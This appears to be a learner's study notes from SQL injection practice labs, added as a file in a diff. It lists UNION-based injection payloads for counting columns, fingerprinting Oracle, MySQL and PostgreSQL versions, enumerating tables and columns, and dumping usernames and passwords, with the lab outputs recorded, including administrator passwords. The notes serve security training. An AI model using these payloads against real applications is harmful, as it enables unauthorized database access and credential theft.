@@ -1,0 +1,119 @@
+ ' used to see the vernalability
+
+ ' order by 1-- used to determine how many coloums are present in the table 
+
+error at 'order by 3 which means there are only 2 coloums 
+
+ ' UNION SELECT 'a','a' from DUAL-- used to see, if the colurs are string characters
+ if a error of 500 is detected then the database is in oracal form so we have to use the following to see the vernability
+
+ ' UNION SELECT banner, NULL from v$version-- 
+
+ used in oracal to see the dataversion , 
+ Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+
+ ----------completed lab07   oracle type 
+
+
+ in some sql injections the -- operater cannot be used and only # can be used in place of that commant operater
+
+ ' order by 1#  used to find how many coloums are present in that 
+
+ ' UNION SELECT 'a','a'# used to know that the type is a string with characters 
+
+ ' UNION SELECT @version, NULL# used to find the data version 
+
+ here it is 8.0.39-0ubuntu0.20.04.1
+ 
+ ---------------completed lab08       microsoft & MySQL type
+ 
+ ' order by 1--  to check how many coloums 
+ 
+ it has 2 coloums only 
+ 
+ ' UNION SELECT 'a','a'--  used to check the coloums contain strings or not 
+ 
+ it is conformed it has two coloums with string character in it.
+ 
+ In the question they mentioned it is a non oracle 
+ 
+ ' UNION SELECT @@version, NULL--   for microsoft and mysql
+ an internal server error is showing so this is not a microsoft or mysql type 
+ 
+ it has to be postgresql So,
+ ' UNION SELECT version(), NULL--   for postgresql
+ PostgreSQL 12.20 (Ubuntu 12.20-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit  --> it is the database version.
+ 
+' UNION SELECT table_name, NULL FROM information_schema.tables--  used to know the table name in which usersnames and passwords are stored.
+
+users_kebnpo
+
+it is the table in which data of usersnames and passwords are stored.
+
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_kebnpo'--
+
+username_smwcql
+password_wipoua
+
+these above are the username & password columns
+
+' UNION SELECT username_smwcql, password_wipoua from users_kebnpo--   used to know the users names and there passwords.
+
+administrator
+iz68a47zqw8ixvbeotyc
+
+----------- lab09 non oracle
+
+' UNION SELECT table_name,NULL FROM all_tables--  
+
+USERS_QLCICS   --> table name 
+
+'UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_QLCICS'--
+
+USERNAME_IVURUI 
+PASSWORD_ISPFOW
+here we have the two columns
+
+' UNION SELECT USERNAME_IVURUI, PASSWORD_ISPFOW from USERS_QLCICS--
+
+administrator
+pefazpukfdxymb4lxd6i 
+
+-------------lab10 listing data content from non oracle database
+
+' order by 3-- so it has 3 coloums 
+
+' UNION SELECT NULL,NULL,NULL-- 
+
+-------------lab 03
+
+' order by 3-- so it has 3 coloums 
+
+' UNION SELECT 'a',NULL,NULL--  no
+' UNION SELECT NULL,NULL,'a'-- no
+' UNION SELECT NULL,'a',NULL-- yes replace the string a with the given string 9elGK4 .
+ -------lab04 
+ 
+ ' order by 2--
+ 
+ ' UNION SELECT NULL,NULL-- 
+ 
+ 'UNION SELECT username, password from users--
+ 
+ administrator
+ kjz5lqgxbsqwytzk17my
+ 
+ ----------lab05
+ ' order by 2--
+ 
+ ' UNION SELECT NULL,NULL-- 
+ 
+ 'UNION SELECT NULL, username || '~' || password from users--   ---> this command is used so that the user name and password is given in the below formate.
+ 
+ administrator~gzur668fmky5zt8kdqbj
+ 
+ 
+-----------lab06
+ 
+ 
+ 
